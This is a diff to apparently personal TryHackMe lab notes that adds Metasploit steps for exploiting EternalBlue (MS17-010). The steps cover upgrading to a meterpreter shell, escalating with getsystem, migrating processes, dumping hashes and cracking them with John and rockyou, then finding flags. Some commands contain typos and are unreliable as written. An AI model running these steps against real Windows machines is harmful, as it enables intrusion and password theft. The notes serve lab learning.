@@ -29,9 +29,20 @@ Tryhackme.com
 ### Q1: What is the exploit full path
     exploit/windows/smb/ms17_010_eternalblue
 ### Q2: What is required value 
-    RHOSTS
+    RHOSTS 
 ### Task 3: Escalate privlidges, learn how to upgrade shells in metasploit
-
+    background session
+    use post/multi/manage/shell_to_meterpreter
+    set sesion 2
 ### Task 4: Dump non-default user's password and crack it
-
+    getsystem
+    shell
+    whoami
+    ps
+    migrate 2860
+    hashdump
+    john hashes --worldlist=/usr/share/wordlits/rockyou.txt --format=NT
 ### Task 5: Find 3 flags planted on this machine 
+    ls C:\
+    ls C:\users\jon\documents
+    ls c:\windows\system32\config
